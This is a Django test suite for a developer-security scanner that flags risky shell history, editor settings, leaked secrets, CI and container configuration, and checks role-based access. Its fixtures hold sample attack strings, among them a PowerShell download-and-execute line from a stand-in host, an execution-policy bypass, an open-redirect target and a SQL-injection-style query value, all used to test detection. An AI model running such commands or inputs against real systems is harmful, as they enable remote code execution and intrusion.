import shutil
import tempfile
from pathlib import Path
from unittest import mock

from django.contrib.auth import get_user_model
from django.core.management import call_command
from django.test import TestCase, override_settings
from django.urls import reverse

from .checks import dependencies, pipelines, production, repo, terminal, vscode
from .checks.base import ScanContext
from .engine import run_scan
from .models import Finding
from .redact import find_secrets, scrub
from .risk import risk_level, risk_score

TOKEN = 'ghp_' + 'a1B2' * 9  # fake token, built at runtime so this file has no literal secret


def write(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding='utf-8')


class TempMixin:
    def make_tmp(self):
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        self.repo, self.home = tmp / 'repo', tmp / 'home'
        self.repo.mkdir()
        self.home.mkdir()
        return ScanContext(repo_paths=[self.repo], home=self.home, scan_machine=True,
                           env={}, trusted_publishers=('microsoft',))


class RiskTests(TestCase):  # TC-U01: risk calculation
    def test_score_and_cap(self):
        self.assertEqual(risk_score(['Critical', 'High', 'Low']), 18)
        self.assertEqual(risk_score(['Critical'] * 12), 100)

    def test_levels(self):
        self.assertEqual(risk_level(19), 'Low')
        self.assertEqual(risk_level(20), 'Medium')
        self.assertEqual(risk_level(30), 'High')
        self.assertEqual(risk_level(45), 'Critical')

    def test_invalid_inputs(self):
        with self.assertRaises(ValueError):
            risk_score(['Severe'])
        with self.assertRaises(ValueError):
            risk_level(101)


class RedactTests(TestCase):
    def test_token_is_masked_in_evidence(self):
        text = scrub(f'git clone https://x:{TOKEN}@github.com/a/b.git')
        self.assertNotIn(TOKEN, text)
        self.assertIn('****', text)

    def test_password_flag_and_url_credentials_masked(self):
        self.assertNotIn('hunter2hunter2', scrub('tool --password hunter2hunter2'))
        self.assertNotIn('s3cretpw', scrub('https://bob:s3cretpw@example.com'))

    def test_placeholders_are_not_secrets(self):
        self.assertEqual(find_secrets('SECRET_KEY = os.environ.get("X")'), [])
        self.assertEqual(find_secrets('password = change-me-please'), [])
        self.assertEqual(find_secrets('github_token=settings.SDLCGUARD_GITHUB_TOKEN,'), [])
        self.assertEqual(find_secrets("SECRET_KEY = 'dev-only-insecure-key'"), [])
        self.assertTrue(find_secrets('db_password = "Tr0ub4dor&3xyz"'))


class TerminalCheckTests(TempMixin, TestCase):
    def test_history_rules_and_secret_masking(self):
        ctx = self.make_tmp()
        hist = self.home / 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine'
        write(hist / 'ConsoleHost_history.txt', '\n'.join([
            'iwr https://evil.test/x.ps1 | iex',
            'Set-ExecutionPolicy Bypass -Scope Process',
            f'git remote add o https://u:{TOKEN}@github.com/a/b.git',
            'git commit -m x --no-verify', 'dir']))
        results = terminal.check_history(ctx)
        ids = {r.check_id for r in results}
        self.assertTrue({'history-remote-exec', 'history-exec-policy', 'history-no-verify',
                         'history-secret'} <= ids)
        self.assertTrue(all(TOKEN not in r.evidence for r in results))

    def test_environment_reports_names_not_values(self):
        ctx = self.make_tmp()
        ctx.env = {'GITHUB_TOKEN': TOKEN, 'DJANGO_SECRET_KEY': 'x' * 30, 'PATH': '/bin'}
        (result,) = terminal.check_environment(ctx)
        self.assertIn('GITHUB_TOKEN', result.evidence)
        self.assertNotIn(TOKEN, result.evidence)
        self.assertNotIn('DJANGO_SECRET_KEY', result.evidence)


class VSCodeCheckTests(TempMixin, TestCase):
    def test_settings_extensions_and_tasks(self):
        ctx = self.make_tmp()
        write(self.home / '.config/Code/User/settings.json',
              '{"security.workspace.trust.enabled": false, "task.allowAutomaticTasks": "on"}')
        (self.home / '.vscode/extensions/microsoft.python-2024.1.0').mkdir(parents=True)
        (self.home / '.vscode/extensions/shady.thing-1.2.3').mkdir(parents=True)
        write(self.repo / '.vscode/tasks.json', '{"runOptions": {"runOn": "folderOpen"}}')
        self.assertEqual({r.check_id for r in vscode.check_settings(ctx)},
                         {'vscode-trust-off', 'vscode-auto-tasks'})
        (ext,) = vscode.check_extensions(ctx)
        self.assertIn('shady.thing', ext.evidence)
        self.assertNotIn('microsoft.python', ext.evidence)
        self.assertEqual(len(vscode.check_workspace_tasks(ctx)), 1)


class RepoCheckTests(TempMixin, TestCase):
    def test_secrets_found_masked_and_examples_skipped(self):
        ctx = self.make_tmp()
        write(self.repo / 'config.py', f'TOKEN = "{TOKEN}"\n')
        write(self.repo / '.env.example', f'TOKEN={TOKEN}\n')
        write(self.repo / 'ok.py', 'SECRET_KEY = os.environ.get("K")\n')
        results = repo.check_secrets(ctx)
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0].severity, 'Critical')
        self.assertNotIn(TOKEN, results[0].evidence)

    def test_ignore_comment_suppresses_line(self):
        ctx = self.make_tmp()
        write(self.repo / 'a.py', f'T = "{TOKEN}"  # sdlcguard:ignore\n')
        self.assertEqual(repo.check_secrets(ctx), [])

    def test_branch_protection_missing(self):
        ctx = self.make_tmp()
        ctx.github_repo, ctx.github_token = 'me/app', 'tok'
        calls = iter([(200, {'default_branch': 'main'}), (404, {})])
        with mock.patch.object(repo, '_github_get', side_effect=lambda *a: next(calls)):
            (result,) = repo.check_branch_protection(ctx)
        self.assertEqual(result.check_id, 'github-branch-unprotected')

    def test_branch_protection_skipped_without_token(self):
        self.assertEqual(repo.check_branch_protection(self.make_tmp()), [])


class PipelineAndConfigTests(TempMixin, TestCase):
    def test_workflow_requirements_dockerfile_settings(self):
        ctx = self.make_tmp()
        write(self.repo / '.github/workflows/ci.yml',
              'on:\n  pull_request_target:\njobs:\n  b:\n    steps:\n'
              '      - uses: someone/act@main\n      - uses: actions/cache@v4\n'
              '      - run: echo ${{ secrets.T }}\n')
        write(self.repo / 'requirements.txt',
              'django\nrequests==2.0\n--extra-index-url http://x.test/simple\n')
        write(self.repo / 'Dockerfile', 'FROM python:latest\nCMD ["x"]\n')
        write(self.repo / 'site/settings.py',
              'INSTALLED_APPS = []\nDEBUG = True\nALLOWED_HOSTS = ["*"]\nSECRET_KEY = "abc"\n')
        got = {r.check_id for r in pipelines.check_pipelines(ctx)}
        self.assertTrue({'ci-pr-target', 'ci-cache-poison', 'ci-unpinned-actions',
                         'ci-secret-echo'} <= got)
        got = {r.check_id for r in dependencies.check_requirements(ctx)}
        self.assertEqual(got, {'reg-extra-index', 'reg-unpinned'})
        got = {r.check_id for r in dependencies.check_dockerfiles(ctx)}
        self.assertEqual(got, {'reg-image-tag', 'prod-container-root'})
        got = {r.check_id for r in production.check_django_settings(ctx)}
        self.assertEqual(got, {'prod-debug', 'prod-hosts', 'prod-secret-key'})

    def test_safe_configuration_is_clean(self):
        ctx = self.make_tmp()
        write(self.repo / 'requirements.txt', 'django==5.2.1\n')
        write(self.repo / 'Dockerfile', 'FROM python:3.12-slim\nUSER app\n')
        write(self.repo / 's/settings.py', 'INSTALLED_APPS = []\nDEBUG = env("D")\n')
        self.assertEqual(dependencies.check_requirements(ctx), [])
        self.assertEqual(dependencies.check_dockerfiles(ctx), [])
        self.assertEqual(production.check_django_settings(ctx), [])


class EngineTests(TempMixin, TestCase):
    def test_no_duplicates_and_auto_resolve(self):
        ctx = self.make_tmp()
        ctx.scan_machine = False
        secret_file = self.repo / 'leak.py'
        write(secret_file, f'T = "{TOKEN}"\n')
        first = run_scan(ctx=ctx)
        self.assertEqual((first.new_count, first.open_count), (1, 1))
        second = run_scan(ctx=ctx)
        self.assertEqual((second.new_count, Finding.objects.count()), (0, 1))
        secret_file.unlink()
        third = run_scan(ctx=ctx)
        self.assertEqual((third.fixed_count, third.open_count), (1, 0))
        self.assertEqual(Finding.objects.get().status, 'resolved')

    def test_finding_never_stores_the_secret(self):
        ctx = self.make_tmp()
        ctx.scan_machine = False
        write(self.repo / 'leak.py', f'T = "{TOKEN}"\n')
        run_scan(ctx=ctx)
        self.assertNotIn(TOKEN, Finding.objects.get().evidence)

    def test_broken_check_does_not_resolve_its_findings(self):
        ctx = self.make_tmp()
        ctx.scan_machine = False
        write(self.repo / 'leak.py', f'T = "{TOKEN}"\n')
        run_scan(ctx=ctx)
        with mock.patch.object(repo, 'check_secrets', side_effect=RuntimeError('boom')):
            from .checks import CHECKS
            from dataclasses import replace
            patched = [replace(c, run=repo.check_secrets) if c.id == 'repo-secrets' else c
                       for c in CHECKS]
            with mock.patch('scanner.engine.CHECKS', patched):
                scan = run_scan(ctx=ctx)
        self.assertIn('repo-secrets', scan.errors)
        self.assertEqual(Finding.objects.get().status, 'open')


class AccessControlTests(TempMixin, TestCase):  # TC-U02: authentication and RBAC
    @classmethod
    def setUpTestData(cls):
        call_command('seed_users', '--password', 'Str0ng!pass', verbosity=0)

    def login(self, name):
        self.assertTrue(self.client.login(username=name, password='Str0ng!pass'))

    def test_anonymous_redirected_to_login(self):
        r = self.client.get(reverse('dashboard'))
        self.assertEqual(r.status_code, 302)
        self.assertIn('/accounts/login/', r['Location'])

    def test_auditor_cannot_run_scan(self):
        self.login('auditor1')
        self.assertEqual(self.client.post(reverse('run-scan')).status_code, 403)

    def test_devops_cannot_run_scan_but_analyst_can(self):
        self.make_tmp()
        with override_settings(SDLCGUARD_SCAN_PATHS=[self.repo], SDLCGUARD_SCAN_MACHINE=False):
            self.login('devops1')
            self.assertEqual(self.client.post(reverse('run-scan')).status_code, 403)
            self.client.logout()
            self.login('analyst1')
            self.assertEqual(self.client.post(reverse('run-scan')).status_code, 302)

    def test_status_change_roles_and_safe_redirect(self):
        f = Finding.objects.create(fingerprint='f' * 40, source='s', check_id='c',
                                   pillar='vcs', severity='High', title='t', location='l')
        self.login('auditor1')
        self.assertEqual(self.client.post(reverse('finding-status', args=[f.pk]),
                                          {'status': 'resolved'}).status_code, 403)
        self.client.logout()
        self.login('devops1')
        r = self.client.post(reverse('finding-status', args=[f.pk]),
                             {'status': 'resolved', 'next': 'https://evil.example/'})
        self.assertEqual(r['Location'], reverse('dashboard'))
        f.refresh_from_db()
        self.assertEqual(f.status, 'resolved')

    def test_invalid_status_ignored(self):
        f = Finding.objects.create(fingerprint='e' * 40, source='s', check_id='c',
                                   pillar='vcs', severity='High', title='t', location='l')
        self.login('analyst1')
        self.client.post(reverse('finding-status', args=[f.pk]), {'status': 'deleted'})
        f.refresh_from_db()
        self.assertEqual(f.status, 'open')


class DashboardTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        call_command('seed_users', '--password', 'Str0ng!pass', verbosity=0)
        for i, (pillar, sev) in enumerate([('vcs', 'Critical'), ('ci-cd', 'High'),
                                           ('registry', 'Low')]):
            Finding.objects.create(fingerprint=str(i) * 40, source='s', check_id='c',
                                   pillar=pillar, severity=sev, title=f'Issue {i}',
                                   location='x', fix='fix it', evidence='ev')

    def setUp(self):
        self.client.login(username='auditor1', password='Str0ng!pass')

    def test_dashboard_shows_five_pillars_findings_and_png_charts(self):
        import base64
        r = self.client.get(reverse('dashboard'))
        self.assertEqual(r.status_code, 200)
        self.assertEqual(len(r.context['summaries']), 5)
        self.assertEqual(r.context['open_total'], 3)
        self.assertTrue(base64.b64decode(r.context['chart_pillar']).startswith(b'\x89PNG'))
        self.assertNotContains(r, 'Run scan now')  # auditors are read-only

    def test_pillar_filter_and_bad_value(self):
        r = self.client.get(reverse('dashboard'), {'pillar': 'vcs'})
        self.assertEqual(len(r.context['findings']), 1)
        r = self.client.get(reverse('dashboard'), {'pillar': "x' OR 1=1"})
        self.assertEqual(len(r.context['findings']), 3)

    def test_audit_log_roles(self):
        self.assertEqual(self.client.get(reverse('audit-log')).status_code, 200)
        self.client.logout()
        self.client.login(username='analyst1', password='Str0ng!pass')
        self.assertEqual(self.client.get(reverse('audit-log')).status_code, 403)

    def test_demo_users_exist_with_least_privilege_default(self):
        self.assertEqual(get_user_model().objects.count(), 4)
